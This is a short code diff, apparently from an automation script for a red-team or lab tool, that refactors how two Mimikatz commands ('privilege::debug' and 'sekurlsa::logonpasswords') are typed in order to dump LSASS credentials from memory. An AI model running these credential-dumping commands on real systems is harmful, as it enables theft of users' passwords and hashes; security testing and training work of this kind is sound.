@@ -4,10 +4,10 @@
 Mimikatz: Dump LSASS credentials (remove protection, debug, logonpasswords).
 '
 
-paste_command "privilege::debug"
-xdotool key Return
+execute_command "privilege::debug"
+create_new_line
 sleep 1
 
-paste_command "sekurlsa::logonpasswords"
-xdotool key Return
+execute_command "sekurlsa::logonpasswords"
+create_new_line
 
